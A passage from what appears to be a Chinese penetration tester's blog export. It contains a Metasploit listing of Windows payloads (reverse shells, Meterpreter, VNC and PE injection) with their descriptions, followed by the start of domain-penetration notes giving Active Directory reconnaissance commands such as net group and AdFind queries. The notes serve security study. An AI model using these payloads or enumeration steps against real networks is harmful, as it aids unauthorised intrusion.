supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_uuid                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;pingback_bind_tcp                           Open a socket and report UUID when a connection is received (Windows x86)</span><br><span class="line">    windows&#x2F;pingback_reverse_tcp                        Connect back to attacker and report UUID (Windows x86)</span><br><span class="line">    windows&#x2F;powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP</span><br><span class="line">                                                        defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After tha</span><br><span class="line">                                                        t you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shellcode</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the a</span><br><span class="line">                                                        llowed host.</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;shell&#x2F;bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;shell&#x2F;find_tag                              Spawn a piped command shell (staged). Use an established connection</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;shell&#x2F;reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    windows&#x2F;shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell</span><br><span class="line">    windows&#x2F;shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if th</span><br><span class="line">                                                        e connections is not coming from the IP defined in AHOST. This way the port will appear as &quot;closed&quot; helping us to h</span><br><span class="line">                                                        ide the shellcode.</span><br><span class="line">    windows&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    windows&#x2F;speak_pwned                                 Causes the target to say &quot;You Got Pwned&quot; via the Windows Speech API</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from t</span><br><span class="line">                                                        he IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). Aft</span><br><span class="line">                                                        er that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shel</span><br><span class="line">                                                        lcode</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to</span><br><span class="line">                                                         the allowed host.</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;upexec&#x2F;bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;upexec&#x2F;find_tag                             Uploads an executable and runs it (staged). Use an established connection</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, sl</span><br><span class="line">                                                        owly)</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;upexec&#x2F;reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked</span><br><span class="line">                                                         from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hpin</span><br><span class="line">                                                        g). After that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide t</span><br><span class="line">                                                        he shellcode</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command s</span><br><span class="line">                                                        hell to the allowed host.</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;vncinject&#x2F;bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that</span><br><span class="line">                                                        you must first upload data&#x2F;hop&#x2F;hop.php to the PHP server you wish to use as a hop.</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65</span><br><span class="line">                                                        535, slowly)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)</span><br><span class="line">    windows&#x2F;x64&#x2F;exec                                    Execute an arbitrary command (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;loadlibrary                             Load an arbitrary x64 library path</span><br><span class="line">    windows&#x2F;x64&#x2F;messagebox                              Spawn a dialog via MessageBox using a customizable title, text &amp; icon</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_rc4                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows x64 wininet)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows x64 wininet)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows x64 winhttp)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTPS (Windows x64 winhttp)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp_uuid             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_named_pipe                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_rc4                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_uuid                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_named_pipe             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_rc4                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_uuid               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;pingback_reverse_tcp                    Connect back to attacker and report UUID (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;x64&#x2F;powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_rc4                      Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (W</span><br><span class="line">                                                        indows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_rc4                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows</span><br><span class="line">                                                         x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winine</span><br><span class="line">                                                        t)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winine</span><br><span class="line">                                                        t)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Wi</span><br><span class="line">                                                        ndows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhtt</span><br><span class="line">                                                        p)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winht</span><br><span class="line">                                                        tp)</span><br></pre></td></tr></table></figure>
<h2 id="Msfconsole下的模块"><a href="#Msfconsole下的模块" class="headerlink" title="Msfconsole下的模块"></a>Msfconsole下的模块</h2><p>模块我没有记录，因为它的模块都是很有规则的，不需要一个个记它。比如扫描类的都是scanner打头，利用类的都是exploit、misc打头。实在不行还有search命令，所以记模块没用，记住大概就行了。</p>
<p>以上。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透笔记</title>
    <url>/2021/03/26/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>此处是用来自己做笔记的，所以只会以最精简的模式进行记录，相关原理不再赘述。<a id="more"></a></p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="是否处于域环境"><a href="#是否处于域环境" class="headerlink" title="是否处于域环境"></a>是否处于域环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="命令行查看DNS解析记录"><a href="#命令行查看DNS解析记录" class="headerlink" title="命令行查看DNS解析记录"></a>命令行查看DNS解析记录</h2><p>需要在域控上执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dnscmd . &#x2F;ZonePrint exp.com</span><br></pre></td></tr></table></figure>
<h2 id="有几个域"><a href="#有几个域" class="headerlink" title="有几个域"></a>有几个域</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域控是谁"><a href="#域控是谁" class="headerlink" title="域控是谁"></a>域控是谁</h2><p>域内的域控都在Domain Controller这个OU底下</p>
<p>要查询其他的域，/domain后跟:abc.com就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可以用adfind，指定根域DN就行了；或者直接dcdmp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;OU&#x3D;Domain Controllers,DC&#x3D;exp,DC&#x3D;com&quot; -f &quot;(objectclass&#x3D;computer)&quot; -dn</span><br><span class="line"></span><br><span class="line">adfind.exe -sc dcdmp -dn</span><br></pre></td></tr></table></figure>
<h2 id="域管是谁"><a href="#域管是谁" class="headerlink" title="域管是谁"></a>域管是谁</h2><p>注意：域控与域管是两个不同的概念，域控指的机器用户，域管指的域用户。</p>
